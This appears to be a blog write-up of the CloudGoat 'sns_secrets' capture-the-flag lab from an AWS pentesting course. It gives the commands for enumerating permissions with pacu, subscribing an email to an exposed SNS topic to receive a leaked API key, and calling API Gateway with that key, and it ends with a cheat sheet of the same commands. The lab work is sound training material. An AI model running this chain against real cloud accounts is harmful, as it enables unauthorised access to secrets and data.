---
title: "Cloudgoat SNS Secrets"
date: 2025-05-21
draft: false
language: en
featured_image: ../assets/images/posts/snsSecrets_cloudgoat_challenge_logo.png
summary: A walkthrough of the SNS Secrets easy Cloudgoat challenge
authorimage: ../assets/images/posts/cyber-immuno-fusion.png
categories: Blog
tags: ["AWS Pentesting", "SNS", "Cloudgoat"]
---
# Introduction & Context

Hey guys, this is a write-up for the sns_secrets challenge from Cloudgoat, available [here](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/sns_secrets/README.md). The lab will give you credentials to do some basic enumeration on SNS & the API Gateway but not much more than that. This is the second and final capstone challenge from Tyler's [Intro to AWS Pentesting course](https://academy.simplycyber.io/l/pdp/introduction-to-aws-pentesting). As a capstone challenge it was unguided and I had to run through it myself. I'll walk through how I did it (mostly manually) but also point out how you could run it through pacu if you want. I'll be giving some of my thoughts and the commands I ran through this lab. Now onto the lab!

# Setup 

If you haven't started cloudgoat yet, you can start with `cloudgoat create sns_secrets`. Shouldn't take too long to boot up. Once it's set, add the credentials using `aws configure --profile sns_low`. I set the region to `us-east-1` and the format as `json`. 

Of course, we need to validate the keys before using them. Run `aws sts get-caller-identity --profile sns_low`. It should work as that. So let's start!

# Enumerating users

So for this part I'm going to use pacu and hope it works. I'll try enumerating the sns user first. Get it running using these commands:

```bash
pacu 
import_keys sns_low
ran iam__enum_permissions
```

Once that runs (and thankfully it does), run `whoami` in the pacu interface to see what we got. Under permissions you'll see we have the following:

* *sns:listtopics*
* *sns:listsubscriptionsbytopic*
* *sns:gettopicattributes*
* iam:getuserpolicy
* iam:getattacheduserpolicies
* iam:listuserpolicies
* iam:listgroupsforuser
* *sns:subscribe*
* apigateway:get
* *sns:receive*

You'll notice that we're also denied a few things about api-gateway, but we can burn that bridge when we get to it. But here's the key part. The first few sns permissions seem to be related to enumeration while the last couple are about using the system. Those will probably be useful.

# Simple Notification Service(SNS)

## What is it? CLI Commands?

Before we go into SNS we should learn what it is. SNS is amazon's simple notification service. According to [this site](https://aws.amazon.com/sns/), it's a "fully managed Pub/Sub service for A2A and A2P messaging". That basically means it's used for sending notifications to people or other applications. It can be used to send SMS, emails and mobile push notifications too. One of the use cases is "securely encrypt notification message delivery". We'll see how secure this SNS configuration is... If you're curious to learn more, just google it, lots of youtube videos pop up that can explain it way better than I can in a blog post.

So now that I've done a few AWS labs through cloudgoat and seen the json policies for them, I've noticed a pattern in them. When I have a permission like `iam:getuserpolicy`, the execution is typically like `aws sns get-user-policy --MoreFlags`. So taking a wild guess, we're just gonna play around and execute some commands. 

## Enumerate

We're given 3 for enumerating and 2 for using it I think. The second and third say list or get by topic. So we'll need to figure out what the topics are and it seems the first command can do that. A topic by the way is an access point or communciation channel that is used to send messages, according to [this site](https://docs.aws.amazon.com/sns/latest/dg/sns-create-topic.html). So run `aws sns list-topics --profile sns_low` and you'll receive a response giving you a topic arn:

```json
{
    "Topics": [
        {
            "TopicArn": "arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq"
        }
    ]
}
```

So now we can try to see if we can pull anything else off that. Try running `aws sns list-subscription-by-topic --profile sns_low`. That won't work and it says you'll need to add the topic arn as a flag. 

So that's the flag we're going to use for the next couple commands (of course use your own topic):

```bash
aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low

aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low  
```

It seems there are no subscribers to it yet. But it does seem to have a policy to send stuff if we look at the `EffectiveDeliveryPolicy` output from the second command. 

So pull up the [documentation](https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html) and you'll see we can subscribe by email. So let's give that a shot. I had to ask chatgpt the full command for this once I understood it was, but here you go: 

```bash
aws sns subscribe --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --protocol email --region us-east-1 --profile sns_low --notification-endpoint YOUR_EMAIL_HERE
```

I thought we might need to force a receive too, but what do you know. A minute later I get a confirmation email and then a minute later I get another email. And that email had the DEBUG: API GATEWAY KEY!

## An automated approach?

I did this manually but you can also do this by using pacu. If you open pacu using `pacu`, then `import_keys sns_low` there's only 2 commands you need to run to get those emails sent to you. 

1. `run sns__enum --region us-east-1`
2. `data iam` Grab the topic arn from it
3. `run sns__subscribe --topics TOPICARN --email EMAIL`	

# API Gateway

## What is it?

Again, before we go into enumerating this service we should understand what it actually does. According to [this site](https://aws.amazon.com/api-gateway/), it's a service that allows developers to make "secure" APIs at scale. An API is really just an access point for users or applications to interact with something, whether that's a website or a server or something else entirely. But it's only as secure as you make it. So if you have an SNS system that leaks an API key... Well, maybe it's not so secure. 

# Finding the API

I had to ask ChatGPT for some of the commands here. I'll make a note though, don't just blindly copy paste the commands it gives you. It does make assumptions (like it assumed the stage was `prod` and led me on a wild goose chase). Actually take the time to understand the command syntax and what it's giving you before going on.

The first command is to find out what api's are by running `aws apigateway get-rest-apis --profile sns_low`. The key part is the id (first thing in the response). Mine was: `"id": "696zi4tra7"`. 

Now ChatGPT said to grab teh resources using `aws apigateway get-resources --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low`. Under the items section, you'll notice the path is `/user-data`. Note that down. 

And finally we need to grab the actual stage name using `aws apigateway get-stages --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low`. Under the stageName you'll see something like `prod-cgidth6ftmf8pq`. And that's all the information we need. 

## Call the Api

To construct the link we're going to target, use this format: 

https://ID.execute-api.us-east-1.amazonaws.com/STAGENAME/PATH 

Mine was `https://696zi4tra7.execute-api.us-east-1.amazonaws.com/prod-cgidth6ftmf8pq/user-data`. Yours should be similar. 

Now we can call it by passing in the api key using curl: `curl -v -H "x-api-key: 45a3da610dc64703b10e273a4db135bf" https://696zi4tra7.execute-api.us-east-1.amazonaws.com/prod-cgidth6ftmf8pq/user-data`

And you'll get your flag!

# Conclusion

This was an interesting lab where I had to use a lot of the documentation and playing around to get the right commands. We started by enumerating SNS and subscribing ourself to a topic. Using that we found an API key which we could then use the look into the Api gateway and grab our flag. 

*Don't forget to destroy your lab after!*

```bash
cloudgoat destroy sns_secrets
```



# Cheat Sheet

To close off, here's a quick summary of the commands we needed to run to complete this module. If you're ever coming back to this and just need that one command, this is the section to check.

```bash
#Start Up
cloudgoat create sns_secrets
aws configure --profile sns_low

#Pacu our permissions
pacu
import_keys sns_low
run iam__enum_permissions
whoami
exit

#Enumerate SNS
aws sns list-topics --profile sns_low
aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low
aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low   

#Subscribe 
aws sns subscribe --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --protocol email --region us-east-1 --profile sns_low --notification-endpoint unrealperson50@gmail.com

#Alternatively using pacu
pacu
run sns__enum --region us-east-1
data iam 
run sns__subscribe

#Find the api
aws apigateway get-rest-apis --profile sns_low
aws apigateway get-resources --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low
aws apigateway get-stages --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low

#And call it for the flag
curl -v -H "x-api-key: 45a3da610dc64703b10e273a4db135bf" https://696zi4tra7.execute-api.us-east-1.amazonaws.com/prod-cgidth6ftmf8pq/user-data

```

```

```
